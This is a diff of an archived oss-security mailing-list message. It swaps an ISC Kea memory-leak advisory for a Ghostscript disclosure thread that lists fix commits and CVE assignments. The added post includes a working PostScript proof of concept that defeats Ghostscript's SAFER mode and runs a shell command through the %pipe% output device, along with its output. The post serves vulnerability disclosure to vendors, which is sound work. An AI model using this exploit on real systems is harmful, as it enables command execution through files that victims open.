@@ -1,184 +1,198 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/07/11/8
-Message-ID: <af57800d-82d3-a5ae-fc53-95295a7c41dd@isc.org>
-Date: Wed, 11 Jul 2018 15:44:13 -0800
-From: Michael McNally <mcnally@....org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/29/7
+Message-ID: <CAJ_zFk+dpXH453R0Hy5iHzYO2DkZjrBK3Sqh00Aie1z4=VDQOQ@mail.gmail.com>
+Date: Wed, 29 Aug 2018 13:14:41 -0700
+From: Tavis Ormandy <taviso@...gle.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2018-5739: ISC Kea 1.4.0 failure to release memory may exhaust system resources
+Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
 Content-Type: text/plain; charset=utf-8
 
-Today ISC has disclosed a memory leak in Kea 1.4.0 that is potentially
-exploitable as a denial-of-service vector.  Our official disclosure page
-can be found at https://kb.isc.org/article/AA-01626 or the content can
-be found below.
+Thanks Marcus, here are some more necessary commits:
 
-Kea version 1.4.0-P1 (which corrects the memory leak) was publicly
-released today and is available from https://www.isc.org/downloads
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=520bb0ea7519aa3e79db78aaf0589dae02103764
+# 699654 D /invalidaccess checks stop working after a failed restore
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5b5536fa88a9e885032bc0df3852c3439399a5c0
+# 699670 gssetresolution memory corruption
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+# 699671 handling /undefined results in SEGV
+http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+# 699676 PDF interpreter can leave dangerous operators available
 
-Michael McNally
-ISC Security Officer
+Please note that not all issues are resolved, and I have exploits that
+still work against HEAD.
 
------
+For example, this will still work if you pull master as of this writing:
 
-Kea DHCP 1.4.0 may fail to release memory after temporarily storing
-client network packets.  This causes a constant increase in memory
-consumption that can cause server resources to become exhausted,
-leading to loss of DHCP server functionality.
+$ cat testcase.pdf
+%!PS
+% This is ghostscript bug #699687 (split out from bug #699654)
 
-CVE:                 CVE-2018-5739
-Document Version:    2.0
-Posting date:        11 July 2018
-Program Impacted:    Kea DHCP
-Versions affected:   1.4.0
-Severity:            Medium
-Exploitable:         From adjacent networks permitted to relay DHCP
-traffic to
-                     the Kea server
+a0 % just select a papersize to initialize page device
 
-Description:
+% You can't def HWResolution (for example), because currentpagedevice is
+readonly:
+%
+% GS>currentpagedevice wcheck ==
+% false
+%
+% But you can just put or astore into it, because the array itself is
+writable:
+% GS>currentpagedevice /HWResolution get wcheck ==
+% true
+%
+% If you put some junk in there, then grestore stops working.
+currentpagedevice /HWResolution get 0 (foobar) put
 
-   An extension to hooks capabilities which debuted in Kea 1.4.0
-   introduced a memory leak for operators who are using certain
-   hooks library facilities. In order to support multiple requests
-   simultaneously, Kea 1.4 added a callout handle store but
-   unfortunately the initial implementation of this store does not
-   properly free memory in every case.  Hooks which make use of
-   query4 or query6 parameters in their callouts can leak memory,
-   resulting in the eventual exhaustion of available memory and
-   subsequent failure of the server process.
+% this grestore will fail, `stopped` just handles the error instead of
+aborting.
+{ grestore } stopped {} if
 
-Impact:
+% now LockSafetyParams will be incorrectly unset, you can check like this:
+% GS>mark currentdevice getdeviceprops .dicttomark /.LockSafetyParams get
+== pop
+% false
 
-   Only servers using hooks which make use of the callout handle
-   store are affected.  A Kea server which is using one or more
-   hooks libraries that exhibit this problem will increase its
-   memory use over time, with the rate of increase being proportional
-   to the amount of DHCP traffic processed.  Eventually, due to
-   uncontrolled growth, the server will either exhaust all system
-   memory or, if the administrator has set a per-process memory
-   limit, will hit that limit, after which point further memory
-   allocations will fail and the Kea server will crash.
+% we can change and configure devices now, so make sure we're using one with
+% a OutputFile property.
+(ppmraw) selectdevice
 
-   An attacker who is within the broadcast domain of the Kea server
-   or in a network which is permitted to relay DHCP traffic to the
-   Kea server can hasten the arrival of this outcome by deliberately
-   sending a large volume of requests to the Kea server.
+% run a shell command
+mark /OutputFile (%pipe%id) currentdevice putdeviceprops
+showpage
+$ evince testcase.pdf
+uid=1000(taviso) gid=1000(taviso) groups=1000(taviso),10(wheel)
+context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+(libspectre) ghostscript reports: ioerror -12
 
-   Ability to deliberately trigger this vulnerability depends on
-   the hooks libraries used and the hook points used for callouts.
-   Our scoring for this vulnerability is based on the hook points
-   used for hook libraries distributed by ISC and also based on the
-   assumption that the Kea server does not accept arbitrary traffic
-   from the internet (but is protected, e.g. by firewall, and only
-   accepts DHCP traffic from the local broadcast domain and from
-   nearby networks via authorized DHCP relay agents.)  We cannot
-   score every combination, but the risk could be higher to
-   custom-developed hook libraries using other hook points or to
-   servers which accept arbitrary DHCP traffic without restriction.
+Tavis.
 
-CVSS Score:          6.5, or 4.3 if a supervising process will restart
-the Kea server if it terminates.
-CVSS Vector:         CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+On Tue, Aug 28, 2018 at 2:26 AM Marcus Meissner <meissner@...e.de> wrote:
 
-For more information on the Common Vulnerability Scoring System and
-to obtain your specific environmental score please visit:
-https://www.first.org/cvss/calculator/3.0#CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
+> Hi,
+>
+> I had 4 CVEs assigned yesterday afternoon already working from CERTs list,
+> see inline comments below. Please adjust if something is incorrect in them.
+>
+> CERT has mailed overnight that they will take care of the CVE assignment,
+> so
+> I am defering the rest to them.
+>
+> Ciao, Marcus
+>
+> On Mon, Aug 27, 2018 at 04:02:46PM -0700, Tavis Ormandy wrote:
+> > Here is an update, Artifex made a press release
+> > <
+> https://www.darkreading.com/prnewswire2.asp?rkey=20180824UN89145&filter=3930
+> >
+> > listing
+> > some necessary commits, but the list was incomplete.
+> >
+> > Here is a list of relevant commits I'm aware of so far, some issues are
+> > still open with working exploits available. It's my understanding that no
+> > new release is planned until late September, and vendors need to either
+> > ship a git snapshot when all issues are resolved, or apply patches. I
+> have
+> > testcases for each problem, but I think the bugs will be visible
+> eventually
+> > so I'm not posting them here.
+> >
+> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=ea735ba37dc0fd5f5622d031830b9a559dec1cc9
+> > # 699671
+> > handling /undefined results in SEGV
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0edd3d6c63
+> > # 699659 missing type check in ztype
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=78911a01b6 #
+> > 699654 A /invalidaccess checks stop working after a failed restore
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=5516c614dc33 #
+> > 699654 B /invalidaccess checks stop working after a failed restore
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=79cccf641486 #
+> > 699654 C /invalidaccess checks stop working after a failed restore
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b326a716 #
+> 699655
+> > - missing type checking in setcolor
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c3476dde #
+> 699656
+>
+>
+> > - LockDistillerParams boolean missing type checks
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=a054156d42
+>         CVE-2018-15910
+>
+>
+> > # 699658 - Bypassing PermitFileReading by handling undefinedfilename
+> errors
+>
+>
+> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0b6cd1918e1ec4ffd087400a754a845180a4522b
+> > # 699660 - shading_param incomplete type checking
+> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=e01e77a36cbb2e0277bc3a63852244bec41be0f6
+> > # 699660 - shading_param incomplete type checking
+>         CVE-2018-15909
+>
+>
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=c432131c3f
+> > # 699661 - pdf14 garbage collection memory corruption
+> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=971472c83a345a16dac9f90f91258bb22dd77f22
+> > # 699663 - .setdistillerkeys memory corruption
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=241d911127
+> > # 699664 - corrupt device object after error in job
+>
+>
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=0d3901189f
+> > # 699657 - .tempfile SAFER restrictions seem to be broken
+>         CVE-2018-15908
+>
+> >
+> http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=8e9ce5016db968b40e4ec255a3005f2786cce45f
+>
+>
+> > # 699665 - memory corruption in aesdecode
+> > http://git.ghostscript.com/?p=ghostpdl.git;a=commitdiff;h=b575e1ec42
+>
+>         CVE-2018-15911
+>
+> > # 699668 - .definemodifiedfont memory corruption if /typecheck is handled
+> >
+> > Tavis
+> >
+> > On Thu, Aug 23, 2018 at 8:05 AM Bob Friesenhahn <
+> > bfriesen@...ple.dallas.tx.us> wrote:
+> >
+> > > On Thu, 23 Aug 2018, Leonardo Taccari wrote:
+> > > >
+> > > > (Regarding the `file.ps2' and `file.ps3' examples without `PS2:' or
+> > > > `PS3:' prefixes according `convert -debug Policy -log "%e"' it seems
+> > > > that they ends up as:
+> > > >
+> > > > Domain: Coder; rights=Read; pattern="PS" ...
+> > > >
+> > > > ...so should be blocked by the workaround described in
+> > > > VU#332928. But please correct me if I'm wrong.)
+> > >
+> > > This is likely due to header magic detection (e.g. "%!PS-Adobe").  It
+> > > is possible that a different path will be taken if the common
+> > > Postscript header is not detected.  The file extension may then be
+> > > used as a hint.  Also, there are a wide varieties of ImageMagick
+> > > versions in use, with a wide variety of behaviors.
+> > >
+> > > The version of ImageMagick provided by the Ubuntu Linux I am using at
+> > > this moment dates from 2012!
+> > >
+> > > Bob
+> > > --
+> > > Bob Friesenhahn
+> > > bfriesen@...ple.dallas.tx.us,
+> http://www.simplesystems.org/users/bfriesen/
+> > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+> > >
+>
+> --
+> Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; D-90409 Nuernberg; Zi.
+> 3.1-33,+49-911-740 53-432,,serv=loki,mail=wotan,type=real <
+> meissner@...e.de>
+>
 
-Workarounds:
-
-  - Monitoring and routinely restarting ISC Kea DHCPv4 and DHCPv6
-    services may be an effective mitigation for some production
-    environments
-
-  - Running a new build of Kea without any hook libraries that use
-    the callout store is another option, though it may not be a
-    viable option where the production environment is dependent on
-    the other hooks that need to be omitted to avoid these symptoms.
-    These hooks distributed by ISC do not use the callout store and
-    are safe to use:  Lease Commands, Stat Commands, Host Commands
-    (a Kea Premium hook) and Subnet Commands (a subscriber-only
-    hook provided to Kea support customers).
-
-  - Reverting to Kea DHCP 1.3.0 may be possible for some production
-    environments but because of differences in the database schema
-    operators should check carefully before attempting rollback:
-
-	+  If using memfile storage entirely, there should not be
-	   any compatibility issues
-
-	+  If using a database solution for hosts or leases, the
-	   1.4.0 schema will be incompatible with ISC Kea 1.3.0;
-	   the database therefore must be restored from a pre-upgrade
-	   backup for this to be successful.
-
-	+  If you are unsure whether or not you can roll back to
-	   1.3.0 without restoring a previous version of your
-	   database, you may send an e-mail to security-officer@....org
-	   describing your storage setup and we will advise.
-
-
-Active exploits:
-
-   ISC are not aware of any deliberate exploits of this condition
-   but even without deliberate exploitation the memory allocations
-   of affected servers will grow over time until memory exhaustion
-   becomes a problem.
-
-Solution:
-
-   Upgrade to Kea 1.4.0-P1, available via http://www.isc.org/downloads.
-
-Acknowledgements:
-
-   ISC would like to thank Shawn Routhier of Infoblox for making
-   us aware of this issue.
-
-Document Revision History:
-
-   1.0 Advance Notification, 29 June 2018
-   1.1 Corrected description of Subnet Commands hook, 02 July 2018
-   2.0 Public disclosure, 11 July 2018
-
-If you'd like more information on ISC Subscription Support and
-Advance Security Notifications, please visit http://www.isc.org/support/.
-
-Do you still have questions?  Questions regarding this advisory
-should go to security-officer@....org.  To report a new issue,
-please encrypt your message using security-officer@....org's PGP
-key which can be found here:
-  https://www.isc.org/downloads/software-support-policy/openpgp-key/.
-If you are unable to use encrypted email, you may also report new
-issues at: https://www.isc.org/community/report-bug/.
-
-Note:
-
-   ISC patches only currently supported versions. When possible we
-   indicate EOL versions affected.  (For current information on
-   which versions are actively supported, please see
-   http://www.isc.org/downloads/).
-
-ISC Security Vulnerability Disclosure Policy:
-
-   Details of our current security advisory policy and practice can
-   be found here: https://kb.isc.org/article/AA-00861
-
-This Knowledge Base article https://kb.isc.org/article/AA-01626 is
-the complete and official security advisory document.
-
-Legal Disclaimer:
-
-   Internet Systems Consortium (ISC) is providing this notice on
-   an "AS IS" basis. No warranty or guarantee of any kind is expressed
-   in this notice and none should be implied. ISC expressly excludes
-   and disclaims any warranties regarding this notice or materials
-   referred to in this notice, including, without limitation, any
-   implied warranty of merchantability, fitness for a particular
-   purpose, absence of hidden defects, or of non-infringement. Your
-   use or reliance on this notice or materials referred to in this
-   notice is at your own risk. ISC may change this notice at any
-   time.  A stand-alone copy or paraphrase of the text of this
-   document that omits the document URL is an uncontrolled copy.
-   Uncontrolled copies may lack important information, be out of
-   date, or contain factual errors.
-
-(c) 2001-2018 Internet Systems Consortium
